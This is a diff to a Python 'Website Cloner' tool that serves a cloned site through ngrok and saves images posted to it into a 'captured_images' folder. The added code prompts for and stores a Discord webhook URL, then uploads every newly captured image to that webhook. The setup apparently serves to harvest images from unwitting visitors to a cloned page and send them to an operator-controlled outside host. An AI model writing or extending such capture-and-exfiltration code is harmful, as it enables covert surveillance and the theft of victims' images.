@@ -8,6 +8,7 @@ from rich.panel import Panel
 from rich.table import Table
 
 console = Console()
+WEBHOOK_CONFIG = "webhook_config.json"
 
 def run_command(command):
     try:
@@ -35,6 +36,27 @@ def create_virtual_environment():
         console.print(f"[red]Failed to create virtual environment: {str(e)}[/red]")
         return False
 
+def save_webhook_url(url):
+    with open(WEBHOOK_CONFIG, 'w') as f:
+        json.dump({'webhook_url': url}, f)
+
+def get_webhook_url():
+    if os.path.exists(WEBHOOK_CONFIG):
+        try:
+            with open(WEBHOOK_CONFIG, 'r') as f:
+                config = json.load(f)
+                saved_url = config.get('webhook_url')
+                if saved_url:
+                    use_saved = console.input(f"\n[yellow]Found saved Discord webhook URL. Use it? (y/n): [/yellow]").lower() == 'y'
+                    if use_saved:
+                        return saved_url
+        except:
+            pass
+    
+    url = console.input("\n[bold yellow]Enter Discord webhook URL: [/bold yellow]")
+    save_webhook_url(url)
+    return url
+
 def setup():
     console.print(Panel.fit(
         "[bold blue]Website Cloner Setup[/bold blue]\n"
@@ -61,7 +83,8 @@ def setup():
         "beautifulsoup4==4.12.2",
         "flask==3.0.0",
         "pyngrok==7.0.5",
-        "rich==13.7.0"
+        "rich==13.7.0",
+        "discord-webhook==1.3.0"
     ]
     
     for req in requirements:
@@ -146,7 +169,24 @@ def start_cloner():
         from bs4 import BeautifulSoup
         from flask import Flask, request, send_from_directory
         from pyngrok import ngrok
+        from discord_webhook import DiscordWebhook
         
+        # Get Discord webhook URL
+        webhook_url = get_webhook_url()
+        
+        def send_to_discord(image_path):
+            try:
+                with open(image_path, 'rb') as f:
+                    webhook = DiscordWebhook(url=webhook_url)
+                    webhook.add_file(file=f.read(), filename=os.path.basename(image_path))
+                    response = webhook.execute()
+                    if response.status_code == 200:
+                        console.print("[green]✓[/green] Image sent to Discord successfully!")
+                    else:
+                        console.print("[red]Failed to send image to Discord[/red]")
+            except Exception as e:
+                console.print(f"[red]Error sending to Discord: {str(e)}[/red]")
+
         def clone_website_content(url):
             try:
                 console.print(f"\n[bold green]Cloning website: {url}...[/bold green]")
@@ -269,6 +309,9 @@ def start_cloner():
             image_path = os.path.join('captured_images', f'capture_{len(os.listdir("captured_images"))}.png')
             image.save(image_path)
             console.print(f"[green]✓[/green] New image captured: {image_path}")
+            
+            # Send to Discord
+            send_to_discord(image_path)
             return 'Image saved', 200
         
         def display_status(public_url):
